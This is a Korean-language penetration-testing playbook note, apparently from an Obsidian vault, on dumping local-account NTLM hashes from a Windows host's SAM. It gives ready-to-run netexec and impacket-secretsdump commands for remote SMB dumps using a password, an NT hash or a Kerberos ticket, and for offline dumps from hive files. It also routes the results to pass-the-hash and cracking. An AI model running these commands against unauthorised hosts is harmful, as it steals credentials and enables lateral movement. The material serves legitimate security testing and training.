---
tags:
  - 환경/windows
시작조건: ["대상 Windows 호스트의 원격 관리자급 SMB 작업 권한 또는 SAM·SYSTEM hive 확보"]
필요권한: ["대상 호스트의 로컬 관리자급 원격 작업 권한 또는 SAM·SYSTEM 파일 읽기 권한"]
필요조건: ["SMB 요청자 인증 수단 또는 같은 설치의 sam.save·system.save"]
결과: ["대상 Windows 호스트의 로컬 계정 NTLM hash"]
---

# Windows SAM 로컬 계정 해시 추출

## 한 줄 판단

대상 Windows 호스트에 원격 관리자급 SMB 작업을 수행할 수 있거나 SAM·SYSTEM hive를 확보했으면 로컬 계정별 NTLM hash를 추출한다.

## 사용할 때

- 현재 보유 정보: 대상 호스트의 관리자급 요청자 credential 또는 [[Windows SAM SECURITY SYSTEM 덤프]]로 확보한 SAM·SYSTEM 파일이 있다.
- 명령 실행 위치: SMB로 대상에 접근하는 Linux 공격 호스트 또는 hive 파일이 있는 Linux 분석 호스트다.
- 현재 가능한 행동과 결과: 로컬 계정 NTLM hash를 얻을 수 있지만 같은 이름의 도메인 계정 hash나 원격 관리자 권한으로 해석하지 않는다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 원격 경로 | 요청자 계정으로 대상 SMB 인증과 관리자급 원격 작업 가능 | `netexec smb`의 인증 주체와 `Pwn3d!` 확인 | 인증 성공과 원격 관리자 토큰 분리 확인 |
| 오프라인 경로 | 같은 설치·시점의 SAM·SYSTEM 확보 | 파일 출처와 존재 확인 | 누락·시점 불일치 hive 재획득 |
| 현재 계정 또는 인증 수단 | 요청자 비밀번호·NT hash·Kerberos ccache 중 하나 | 요청자 계정 범위와 principal 확인 | 로컬·도메인 계정 및 hash 소유자 재확인 |

## 실행

### Linux 공격 호스트에서 원격 추출

요청자 평문 비밀번호:

```bash
netexec smb <TARGET> -d <DOMAIN> -u <REQUESTER> -p '<PASSWORD>' --sam
impacket-secretsdump '<DOMAIN>/<REQUESTER>:<PASSWORD>@<TARGET>'
```

대상 로컬 요청자 계정:

```bash
netexec smb <TARGET> --local-auth -u <LOCAL_REQUESTER> -p '<PASSWORD>' --sam
```

요청자 NT hash:

```bash
netexec smb <TARGET> -d <DOMAIN> -u <REQUESTER> -H <NT_HASH> --sam
impacket-secretsdump -hashes :<NT_HASH> '<DOMAIN>/<REQUESTER>@<TARGET>'
```

요청자 Kerberos ccache:

```bash
export KRB5CCNAME=<CCACHE_FILE>
klist
impacket-secretsdump -k -no-pass '<DOMAIN>/<REQUESTER>@<TARGET_FQDN>'
```

`<NT_HASH>`는 dump 결과로 얻을 로컬 계정 hash가 아니라 원격 작업을 요청하는 계정의 NT hash다.

### Linux 분석 호스트에서 오프라인 추출

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

확인할 출력:

- `Dumping local SAM hashes`.
- `<LOCAL_USER>:<RID>:<LM_HASH>:<NT_HASH>:::` 형식의 로컬 계정 행.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `Dumping local SAM hashes`와 계정별 NTLM hash | SAM 복호화 성공 | 로컬 계정 hash 확보 | [[Pass the Hash]] 또는 [[오프라인 해시 크래킹]] |
| `STATUS_LOGON_FAILURE` | 요청자 인증 실패 | dump 미실행 | 계정 범위·비밀번호·hash·ticket 확인 |
| `rpc_s_access_denied` | 인증은 됐지만 원격 관리자 권한 부족 | 원격 추출 실패 | 요청자 토큰과 로컬 관리자급 작업 권한 확인 |

## 확인할 출력과 권한

- 요청자 인증 성공과 대상 로컬 계정 hash 출력을 분리한다.
- 추출된 hash는 대상 호스트의 로컬 계정에 속하며 같은 이름의 도메인 계정 hash가 아니다.
- hash 사용 뒤 실제 원격 로그인 권한과 관리자 권한을 따로 확인한다.

## 관련 상태 라우터

- [[확보한 자격 증명으로 원격 접근 경로 선택]]

## 관련 도구

- [[impacket-secretsdump]]
- [[netexec]]
- [[klist]]

